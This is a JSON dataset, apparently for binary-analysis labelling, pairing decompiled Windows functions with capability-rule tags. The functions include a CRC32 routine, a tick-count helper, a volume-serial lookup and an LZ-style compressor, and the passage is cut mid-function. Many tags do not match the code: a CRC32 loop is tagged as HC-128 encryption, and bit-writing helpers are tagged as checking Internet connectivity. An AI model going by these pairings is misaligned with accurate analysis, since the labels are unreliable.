{
    "00401000": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00401000(uint param_1, uint param_2, uint32_t *param_3, uint32_t param_4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    // [00] -r-x section size 16384 named .text\n    uVar2 = 0;\n    if (param_3 != NULL) {\n        uVar2 = 0xffffffff;\n        if (param_4 != 0) {\n            do {\n                if ((param_3 & 3) == 0) break;\n                uVar1 = *param_3;\n                param_3 = param_3 + 1;\n                uVar2 = uVar2 >> 8 ^ *((uVar2 ^ uVar1) * 4 + 0x405150);\n                param_4 = param_4 - 1;\n            } while (param_4 != 0);\n            uVar3 = param_4 & 7;\n            for (param_4 = param_4 >> 3; param_4 != 0; param_4 = param_4 - 1) {\n                uVar2 = (uVar2 ^ *param_3) >> 8 ^ *(((uVar2 ^ *param_3) & 0xff) * 4 + 0x405150);\n                uVar2 = uVar2 >> 8 ^ *((uVar2 & 0xff) * 4 + 0x405150);\n                uVar2 = uVar2 >> 8 ^ *((uVar2 & 0xff) * 4 + 0x405150);\n                uVar2 = uVar2 >> 8 ^ *((uVar2 & 0xff) * 4 + 0x405150) ^ param_3[1];\n                param_3 = param_3 + 2;\n                uVar2 = uVar2 >> 8 ^ *((uVar2 & 0xff) * 4 + 0x405150);\n                uVar2 = uVar2 >> 8 ^ *((uVar2 & 0xff) * 4 + 0x405150);\n                uVar2 = uVar2 >> 8 ^ *((uVar2 & 0xff) * 4 + 0x405150);\n                uVar2 = uVar2 >> 8 ^ *((uVar2 & 0xff) * 4 + 0x405150);\n            }\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                uVar1 = *param_3;\n                param_3 = param_3 + 1;\n                uVar2 = uVar2 >> 8 ^ *((uVar2 ^ uVar1) * 4 + 0x405150);\n            }\n        }\n        uVar2 = ~uVar2;\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 643
    },
    "00403901": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __fastcall fcn.00403901(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)(param_1);\n    return uVar1 >> 3 | uVar1 << 0x1d;\n}\n",
        "token_count": 90
    },
    "004010e0": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar fcn.004010e0(int32_t param_1)\n\n{\n    if (param_1 < 2) {\n        return 'd';\n    }\n    if (param_1 < 4) {\n        return '\\x02';\n    }\n    if (param_1 < 8) {\n        return '\\x04';\n    }\n    if (param_1 < 0x10) {\n        return '\\x06';\n    }\n    if (param_1 < 0x20) {\n        return '\\b';\n    }\n    if (param_1 < 0x40) {\n        return '\\n';\n    }\n    if (param_1 < 0x80) {\n        return '\\f';\n    }\n    if (param_1 < 0x100) {\n        return '\\x0e';\n    }\n    if (param_1 < 0x200) {\n        return '\\x10';\n    }\n    if (param_1 < 0x400) {\n        return '\\x12';\n    }\n    if (param_1 < 0x800) {\n        return '\\x14';\n    }\n    if (param_1 < 0x1000) {\n        return '\\x16';\n    }\n    if (param_1 < 0x2000) {\n        return '\\x18';\n    }\n    if (param_1 < 0x4000) {\n        return '\\x1a';\n    }\n    if (param_1 < 0x8000) {\n        return '\\x1c';\n    }\n    return (0xffff < param_1) * '\\x02' + '\\x1e';\n}\n",
        "token_count": 351
    },
    "00401c9d": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall\nfcn.00401c9d(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t *param_4, int32_t *param_5, code *param_6, \n            int32_t *param_7)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    int32_t *unaff_EDI;\n    int32_t *piVar10;\n    int32_t *unaff_retaddr;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    int32_t iStack24;\n    uint uStack20;\n    int32_t *piStack16;\n    int32_t *piStack12;\n    int32_t *piStack8;\n    int32_t *piStack4;\n    \n    if (param_4 == NULL) {\n        return 0;\n    }\n    if (((param_2 == 0) || (param_3 == 0)) || (param_5 == NULL)) {\n        return 0xffffffff;\n    }\n    param_1[0x105] = param_2;\n    param_1[0x108] = param_2 + -1;\n    param_1[0x104] = param_3;\n    uVar2 = 0xabeefbee;\n    uVar6 = 0;\n    do {\n        uVar2 = (uVar2 << 1 | uVar2 < 0) ^ *(uVar6 + 0x405550);\n        uVar2 = (uVar2 << 1 | uVar2 < 0) ^ *(uVar6 + 0x405551);\n        uVar2 = (uVar2 << 1 | uVar2 < 0) ^ *(uVar6 + 0x405552);\n        puVar1 = uVar6 + 0x405553;\n        uVar6 = uVar6 + 4;\n        uVar2 = (uVar2 << 1 | uVar2 < 0) ^ *puVar1;\n    } while (uVar6 < 0x100);\n    if (uVar2 == 0) {\n        *param_1 = param_5;\n        piVar9 = param_1 + 1;\n        iVar7 = param_5 + 0x5a018;\n        piVar10 = 0x100;\n        do {\n            *piVar9 = iVar7;\n            uVar2 = 0;\n            do {\n                *(*piVar9 + uVar2) = 0;\n                uVar2 = uVar2 + 4;\n            } while (uVar2 < 0x400);\n            iVar7 = iVar7 + 0x400;\n            piVar9 = piVar9 + 1;\n            piVar10 = piVar10 - 1;\n        } while (piVar10 != NULL);\n        param_1[0x109] = -1;\n        param_1[0x102] = param_1[0x105];\n        param_1[0x101] = 1;\n        param_1[0x103] = 0;\n        **param_1 = 0;\n        param_1[0x10a] = 0;\n        piStack44 = 0xffffffff;\n        *param_1[0x104] = *param_1[0x105];\n        param_1[0x105] = param_1[0x105] + 1;\n        param_1[0x104] = param_1[0x104] + 1;\n        param_1[0x107] = 1;\n        param_5 = 0x1;\n        piVar9 = piVar10;\n        piStack48 = piVar10;\n        piVar8 = 0x1;\n        if (1 < param_4 - 1U) {\n            do {\n                if (((param_6 != NULL) && (piStack48 = piStack48 + 1,  piStack48 == '\\0')) &&\n                   (iVar7 = (*param_6)(param_4, param_1[0x105] - param_2, param_1[0x104] - param_3, param_7), \n                   iVar7 == 0)) {\n                    return 0xffffffff;\n                }\n                if (param_5 == piStack44) {\n                    piStack28 = piStack4;\n                    piStack32 = piStack8;\n                    piVar8 = piStack4;\n                }\n                else {\n                    fcn.004019d6();\n                    piVar8 = piStack44;\n                }\n                if (piVar8 < 2) {\n                    if (piVar10 == NULL) {\n                        fcn.004013d2();\n                    }\n                    else {\n                        piVar10 = piVar10 + 1;\n                    }\ncode_r0x0040241c:\n                    param_1[0x105] = param_1[0x105] + 1;\n                }\n                else {\n                    piVar12 = NULL;\n                    piVar5 = param_5;\n                    piVar11 = param_5;\n                    if (piStack32 == param_1[0x109]) {\n                        if ((0x1 < piVar10) && (piStack16 != param_1[0x109])) {\n                            iVar7 = fcn.00401379(piVar9, param_5 - piVar10, piVar10);\n                            iVar3 = fcn.0040165a(piStack28, piVar10);\n                            if (((iVar3 < iVar7) && ((piStack36 < 0x500 || (piVar10 != 0x2)))) &&\n                               ((piVar5 = piStack4,  piStack36 < 32000 || (piVar10 != 0x3)))) goto code_r0x00401ed6;\n                        }\n                    }\n                    else {\ncode_r0x00401ed6:\n                        piStack40 = param_4 - piVar5;\n                        fcn.004019d6(&piStack8, param_1[0x105] + 1, piVar5 + 1, piStack40 - 1);\n                        piVar11 = piStack28;\n                        if (iStack24 < piStack48) {\n                            fcn.0040165a(piStack48, piVar8);\n                            fcn.0040165a(piStack32, piStack28);\n                            piVar5 = piStack16;\n                        }\n                        else {\n                            fcn.0040165a(piStack48, piVar8);\n                            fcn.0040165a(piStack32, piStack28);\n                        }\n                        if ((piVar10 != NULL) && (piVar8 <= piStack36)) {\n                            iVar7 = fcn.0040165a(unaff_EDI, piVar8);\n                            iVar3 = fcn.0040165a();\n                            piVar5 = piStack32;\n                            if (iVar3 < iVar7) {\n                                piVar11 = 0x1;\n                            }\n                        }\n                        if ((piVar10 != NULL) || (piVar8 <= piStack4)) {\ncode_r0x00402010:\n                            if (piVar12 == NULL) goto code_r0x0040201b;\ncode_r0x004023e9:\n                            if (piVar10 == NULL) {\n                                piVar9 = param_1[0x105];\n                                piStack16 = piStack32;\n                                piStack12 = piVar8;\n                            }\n                            piVar10 = piVar10 + 1;\n                            param_5 = piVar5;\n                            goto code_r0x0040241c;\n                        }\n                        iVar7 = fcn.00401379(param_1[0x105], piVar5, 1);\n                        iVar3 = fcn.0040165a(uStack20, piStack16);\n                        iVar4 = fcn.0040165a(piVar11, piVar8);\n                        piVar5 = piStack12;\n                        if (iVar3 + 1 + iVar7 <= iVar4) goto code_r0x00402010;\ncode_r0x0040201b:\n                        piVar11 = piVar5;\n                        if (2 < piVar8) {\n                            fcn.004019d6(&iStack24, param_1[0x105] + 2, piVar5 + 2, piStack40 - 2);\n                            if (piStack40 < piStack48) {\n                                fcn.0040165a(piStack40, piStack36);\n                                fcn.0040165a(piVar9, piVar8);\n                            }\n                            else {\n                                fcn.0040165a(piStack40, piStack36);\n                                fcn.0040165a(piVar9, piVar8);\n                            }\n                            if ((piVar10 != NULL) && (piVar8 <= piVar12)) {\n                                iVar7 = fcn.0040165a(piVar9, piVar12);\n                                iVar3 = fcn.0040165a();\n                                piVar5 = param_5;\n                                if (iVar7 < iVar3) goto code_r0x004023e9;\n                            }\n                            piVar5 = param_5;\n                            if (piVar12 != NULL) goto code_r0x004023e9;\n                            piVar11 = param_5;\n                            if (3 < piVar8) {\n                                fcn.004019d6(&iStack24, param_1[0x105] + 3, param_5 + 3, piStack40 - 3);\n                                if (piStack40 < piStack48) {\n                                    fcn.0040165a(piStack40, piStack36);\n                                    fcn.0040165a(piStack48, piVar8);\n                                }\n                                else {\n                                    fcn.0040165a(piStack40, piStack36);\n                                    fcn.0040165a(piStack48, piVar8);\n                                }\n                                if ((piVar10 != NULL) && (piVar8 <= piVar12)) {\n                                    iVar7 = fcn.0040165a(piVar9, piVar12);\n                                    iVar3 = fcn.0040165a();\n                                    if (iVar7 < iVar3) goto code_r0x004023e9;\n                                }\n                                if (piVar12 != NULL) goto code_r0x004023e9;\n                            }\n                        }\n                    }\n                    if (piVar10 != NULL) {\n                        if (piVar10 < 0x2) {\n                            fcn.004013d2(piVar9, piVar11 - 1);\ncode_r0x00402340:\n                            piVar10 = NULL;\n                        }\n                        else {\n                            piVar5 = param_4 + (piVar10 - piVar11);\n                            if (piVar10 < piVar5) {\n                                piVar5 = piVar10;\n                            }\n                            piVar12 = piVar11 - piVar10;\n                            piVar11 = piVar12;\n                            fcn.004019d6(&iStack24, piVar9, piVar12, piVar5);\n                            if (piVar10 <= piStack36) {\n                                iVar7 = fcn.0040165a(piStack40, piVar10);\n                                piVar12 = piVar9;\n                                iVar3 = fcn.0040165a(piStack40, piVar10);\n                                if (iVar7 < iVar3) {\n                                    piStack44 = piVar11;\n                                }\n                            }\n                            piVar9 = piStack28;\n                            iVar3 = fcn.00401379();\n                            unaff_EDI = unaff_retaddr;\n                            iVar4 = fcn.0040165a(unaff_retaddr, piVar10);\n                            iVar7 = iStack24;\n                            piVar11 = param_7;\n                            piStack48 = piVar10;\n                            if (iVar4 < iVar3) {\n                                if (iStack24 == param_1[0x109]) {\n                                    piStack40 = fcn.00401379(piVar10, piStack44, piVar10);\n                                    iVar3 = fcn.0040165a(iVar7, piVar8);\n                                    piStack48 = piVar10 + iVar3;\n                                    iVar7 = fcn.0040165a(iVar7 + 1, piVar8);\n                                    unaff_EDI = piStack36;\n                                    piVar8 = piVar9;\n                                    iVar3 = fcn.0040165a();\n                                    piVar11 = piStack12;\n                                    piVar9 = piVar8;\n                                    if (unaff_EDI <= iVar7 + iVar3) goto code_r0x00402314;\n                                }\n                                if (((piStack8 == param_1[0x109]) && (param_1[0x10a] == 0)) ||\n                                   (((piStack8 < 0x500 || (piVar10 != 0x2)) && ((piStack8 < 32000 || (piVar10 != 0x3))))\n                                   )) {\n                                    fcn.004016dc(piStack8);\n                                    goto code_r0x00402340;\n                                }\n                            }\ncode_r0x00402314:\n                            do {\n                                fcn.004013d2(piStack48);\n                                piVar9 = piVar9 + 1;\n                                piVar10 = piVar10 + -1;\n                            } while (piVar10 != NULL);\n                        }\n                    }\n                    param_5 = piVar11;\n                    if (piVar8 < 4) {\n                        iVar7 = fcn.00401379(param_1[0x105], piVar11, piVar8);\n                        iVar3 = fcn.0040165a(piStack44, piVar8);\n                        param_5 = piStack4;\n                        piVar5 = piVar8;\n                        if ((iVar7 < iVar3) ||\n                           (((piVar12 != param_1[0x109] || (param_1[0x10a] != 0)) &&\n                            (((0x4ff < piVar12 && (piVar8 == 0x2)) || (31999 < piVar12)))))) {\n                            while (piVar5 != NULL) {\n                                fcn.004013d2();\n                                param_1[0x105] = param_1[0x105] + 1;\n                                piVar11 = piVar11 - 1;\n                                piVar5 = piVar11;\n                            }\n                            param_5 = (piVar8 - 1U) + param_5;\n                            goto code_r0x00402422;\n                        }\n                    }\n                    fcn.004016dc();\n                    param_1[0x105] = param_1[0x105] + piVar8;\n                    param_5 = (piVar8 - 1U) + param_5;\n                }\ncode_r0x00402422:\n                piVar11 = piVar10;\n                if ((piVar10 != NULL) && (piVar10 == piStack12)) {\n                    piVar8 = param_5 - piVar10;\n                    piVar5 = piVar8;\n                    fcn.004019d6();\n                    piStack44 = &iStack24;\n                    if (piVar10 <= piStack36) {\n                        iVar7 = fcn.0040165a(piStack40, piVar10);\n                        piStack44 = piStack40;\n                        piVar8 = piVar9;\n                        iVar3 = fcn.0040165a();\n                        if (iVar7 < iVar3) {\n                            piStack44 = piVar5;\n                        }\n                    }\n                    piVar9 = piStack28;\n                    iVar7 = fcn.00401379(piStack28, piVar8);\n                    unaff_EDI = unaff_retaddr;\n                    iVar3 = fcn.0040165a(unaff_retaddr, piVar10);\n                    piStack48 = piVar10;\n                    if ((iVar3 < iVar7) &&\n                       (((piStack8 == param_1[0x109] && (param_1[0x10a] == 0)) ||\n                        (((piStack8 < 0x500 || (piVar10 != 0x2)) && ((piStack8 < 32000 || (piVar10 != 0x3)))))))) {\n                        fcn.004016dc(piStack8);\n                        piVar11 = NULL;\n                    }\n                    else {\n                        do {\n                            fcn.004013d2(piVar10);\n                            piVar9 = piVar10 + 1;\n                            piVar11 = piVar11 + -1;\n                            piVar10 = piVar9;\n                        } while (piVar11 != NULL);\n                    }\n                }\n                param_5 = param_5 + 1;\n                piVar10 = piVar11;\n            } while (param_5 < param_4 - 1U);\n            piVar8 = param_5;\n            if (piVar11 != NULL) {\n                if (piVar11 < 0x2) {\n                    fcn.004013d2();\n                }\n                else {\n                    iVar7 = fcn.00401379(piVar9, param_5 - piVar11, piVar11);\n                    iVar3 = fcn.0040165a();\n                    if ((iVar7 < iVar3) ||\n                       (((piStack36 != param_1[0x109] || (param_1[0x10a] != 0)) &&\n                        (((0x4ff < piStack36 && (piVar11 == 0x2)) || ((31999 < piStack36 && (piVar11 == 0x3)))))))) {\n                        do {\n                            fcn.004013d2(piVar10, param_5 - piVar11, piStack28);\n                            piVar10 = piVar10 + 1;\n                            piVar11 = piVar11 + -1;\n                        } while (piVar11 != NULL);\n                    }\n                    else {\n                        fcn.004016dc();\n                    }\n                }\n            }\n        }\n        for (; piVar8 < param_4; piVar8 = piVar8 + 1) {\n            fcn.004013d2();\n            param_1[0x105] = param_1[0x105] + 1;\n        }\n        piVar9 = param_1 + 0x107;\n        *piVar9 = *piVar9 + -1;\n        if (*piVar9 == 0) {\n            param_1[0x106] = param_1[0x104];\n            param_1[0x107] = 8;\n            param_1[0x104] = param_1[0x104] + 1;\n        }\n        *param_1[0x106] = *param_1[0x106] * '\\x02' + '\\x01';\n        piVar9 = param_1 + 0x107;\n        *piVar9 = *piVar9 + -1;\n        if (*piVar9 == 0) {\n            param_1[0x106] = param_1[0x104];\n            param_1[0x107] = 8;\n            param_1[0x104] = param_1[0x104] + 1;\n        }\n        *param_1[0x106] = *param_1[0x106] * '\\x02' + '\\x01';\n        piVar9 = param_1 + 0x107;\n        *piVar9 = *piVar9 + -1;\n        if (*piVar9 == 0) {\n            param_1[0x106] = param_1[0x104];\n            param_1[0x107] = 8;\n            param_1[0x104] = param_1[0x104] + 1;\n        }\n        *param_1[0x106] = *param_1[0x106] << 1;\n        *param_1[0x104] = 0;\n        param_1[0x104] = param_1[0x104] + 1;\n        *param_1[0x106] = *param_1[0x106] << (param_1[0x107] - 1U & 0x1f);\n        if ((param_6 != NULL) &&\n           (iVar7 = (*param_6)(param_4, param_1[0x105] - param_2, param_1[0x104] - param_3, param_7),  iVar7 == 0)) {\n            return 0xffffffff;\n        }\n        uVar2 = param_1[0x104] - param_3;\n    }\n    return uVar2;\n}\n",
        "token_count": 4596
    },
    "004037d6": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004037d6(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpRootPathName;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = *0x4070f0;\n    if (*0x4070e8 == 0) {\n        var_4h = (*_sym.imp.KERNEL32.dll_GetTempPathA)(0x104, &lpRootPathName);\n        if ((var_4h < 2) || (lpRootPathName._1_1_ != ':')) {\n            uVar2 = 0;\n        }\n        else {\n            lpRootPathName._3_1_ = 0;\n            (*_sym.imp.KERNEL32.dll_SetErrorMode)(1);\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)(&lpRootPathName, 0, 0, &var_8h, 0, 0, 0, 0);\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                *0x4070e8 = 1;\n                *0x4070f0 = var_8h;\n                *0x4070f4 = 0;\n                uVar2 = var_8h;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 304
    },
    "004011cc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004011cc(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    \n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    pcVar2 = *(param_1 + 0x418);\n    if (param_2 != 0) {\n        *pcVar2 = *pcVar2 * '\\x02' + '\\x01';\n        return;\n    }\n    *pcVar2 = *pcVar2 << 1;\n    return;\n}\n",
        "token_count": 218
    },
    "00401273": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401273(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    \n    uVar4 = param_2;\n    iVar3 = 0;\n    do {\n        iVar5 = iVar3;\n        uVar6 = param_2 & 1;\n        param_2 = param_2 >> 1;\n        uVar4 = uVar6 + uVar4 * 2;\n        iVar3 = iVar5 + 1;\n    } while (1 < param_2);\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        pcVar2 = *(param_1 + 0x418);\n        if ((uVar4 & 1) == 0) {\n            *pcVar2 = *pcVar2 << 1;\n        }\n        else {\n            *pcVar2 = *pcVar2 * '\\x02' + '\\x01';\n        }\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        uVar4 = uVar4 >> 1;\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n    }\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    pcVar2 = *(param_1 + 0x418);\n    if ((uVar4 & 1) == 0) {\n        *pcVar2 = *pcVar2 << 1;\n    }\n    else {\n        *pcVar2 = *pcVar2 * '\\x02' + '\\x01';\n    }\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n    return;\n}\n",
        "token_count": 824
    },
    "004016dc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004016dc(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    char cVar3;\n    \n    uVar2 = param_2;\n    cVar3 = param_2;\n    if (*(param_1 + 0x428) == 0) {\n        *(param_1 + 0x428) = 1;\n        if (((param_2 < 0x80) && (param_3 < 4)) && (param_2 != *(param_1 + 0x424))) {\n            fcn.0040123e();\n            fcn.0040123e();\n            fcn.0040120f();\n            **(param_1 + 0x410) = (param_3 & 1) + cVar3 * '\\x02';\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n            *(param_1 + 0x424) = param_2;\n            return;\n        }\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        if (param_2 == *(param_1 + 0x424)) {\n            piVar1 = param_1 + 0x41c;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                *(param_1 + 0x418) = *(param_1 + 0x410);\n                *(param_1 + 0x41c) = 8;\n                *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n            }\n            **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n            piVar1 = param_1 + 0x41c;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                *(param_1 + 0x418) = *(param_1 + 0x410);\n                *(param_1 + 0x41c) = 8;\n                *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n            }\n            **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        }\n        else {\n            fcn.00401273((param_2 >> 8) + 3);\n            **(param_1 + 0x410) = cVar3;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n            *(param_1 + 0x424) = param_2;\n            if (param_2 < 0x80) {\n                fcn.00401273(param_2 - 2);\n                return;\n            }\n            if (0x4ff < param_2) {\n                param_2 = param_2 - 1;\n            }\n            if (31999 < uVar2) {\n                fcn.00401273(param_2 - 1);\n                return;\n            }\n        }\n        fcn.00401273(param_2);\n        return;\n    }\n    if ((param_2 < 0x80) && (param_3 < 4)) {\n        fcn.0040123e();\n        fcn.0040123e();\n        fcn.0040120f();\n        **(param_1 + 0x410) = (param_3 & 1) + cVar3 * '\\x02';\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        *(param_1 + 0x424) = param_2;\n        return;\n    }\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n    fcn.00401273((param_2 >> 8) + 2);\n    **(param_1 + 0x410) = cVar3;\n    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    *(param_1 + 0x424) = param_2;\n    if (param_2 < 0x80) {\n        fcn.00401273(param_2 - 2);\n        return;\n    }\n    if (0x4ff < param_2) {\n        param_2 = param_2 - 1;\n    }\n    if (31999 < uVar2) {\n        param_2 = param_2 - 1;\n    }\n    fcn.00401273(param_2);\n    return;\n}\n",
        "token_count": 1576
    },
    "004019d6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004019d6(int32_t *param_1, uint8_t **param_2, uint8_t *param_3, uint8_t *param_4, uint8_t *param_5)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *unaff_ESI;\n    uint32_t uVar8;\n    bool bVar9;\n    uint8_t *puVar10;\n    uint8_t *puStack16;\n    uint8_t *puStack8;\n    int32_t iStack4;\n    \n    puStack16 = NULL;\n    puStack8 = NULL;\n    puVar7 = param_1[0x102];\n    while (puVar7 < param_3) {\n        uVar8 = param_1[0x101];\n        if (uVar8 < uVar8 + 0x16800) {\n            uVar1 = param_1[0x103];\n            if (uVar1 < uVar8) {\n                iVar2 = uVar8 - uVar1;\n            }\n            else {\n                iVar2 = (uVar8 - uVar1) + 0x16800;\n            }\n        }\n        else {\n            iVar2 = 0;\n        }\n        *(*param_1 + iVar2 * 4) = *(param_1[*param_1[0x102] + 1] + param_1[0x102][1] * 4);\n        *(param_1[*param_1[0x102] + 1] + param_1[0x102][1] * 4) = param_1[0x101];\n        param_1[0x101] = param_1[0x101] + 1;\n        param_1[0x102] = param_1[0x102] + 1;\n        if (0x16800 < param_1[0x101] - param_1[0x103]) {\n            param_1[0x103] = param_1[0x101] + -1;\n        }\n        puVar7 = param_1[0x102];\n    }\n    puVar7 = puStack16;\n    puVar10 = puStack8;\n    if (param_5 < 0x16701) {\n        if (param_5 < 0x2) goto code_r0x00401c82;\n    }\n    else {\n        param_5 = 0x16700;\n    }\n    uVar8 = *(param_1[*param_3 + 1] + param_3[1] * 4);\n    if (uVar8 != 0) {\n        iStack4 = 0x800;\n        while ((puVar4 = uVar8 + param_1[0x108],  param_3 <= puVar4 && (uVar8 != 0))) {\n            if (uVar8 + 0x16800 < param_1[0x101] || uVar8 + 0x16800 == param_1[0x101]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar1 = param_1[0x103];\n                if (uVar1 < uVar8) {\n                    iVar2 = uVar8 - uVar1;\n                }\n                else {\n                    iVar2 = (uVar8 - uVar1) + 0x16800;\n                }\n            }\n            uVar8 = *(*param_1 + iVar2 * 4);\n        }\n        if (0x16700 < param_4) {\n            param_4 = 0x16700;\n        }\n        puVar6 = 